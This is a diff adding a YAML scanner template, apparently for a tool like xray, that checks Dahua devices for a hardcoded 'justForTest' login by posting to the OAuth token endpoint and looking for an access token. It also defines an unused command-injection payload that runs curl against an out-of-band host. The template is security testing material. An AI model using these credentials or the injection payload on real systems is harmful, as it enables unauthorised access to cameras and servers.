@@ -1,0 +1,36 @@
+id: dahua-wulian-justForTest-login
+info:
+  name: dahua-wulian-justForTest-login
+  severity: critical
+  author: 
+
+set:
+  oob: oob()
+  oobHTTP: oob.HTTP
+  oobDNS: oob.DNS
+  s1: randomLowercase(8)
+  base64payload: base64("\';curl " + oobHTTP + " %23")
+rules:
+  r0:
+    request:
+      raw: |-
+        POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
+        Content-Length: 109
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        Connection: close
+        
+        username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
+    expression: response.status == 200 && (response.body.bcontains(b"access_token") || response.body.ibcontains(b"access_token"))
+
+    output:
+      search: |-
+        "(?P<rfile>\\w+.jsp)".bsubmatch(response.body)
+      rfile: search["rfile"]
+      search1: |-
+        "(?P<rdir>ico.*jsp)".bsubmatch(response.body)
+      rdir: search["rdir"]
+
+expression: r0()
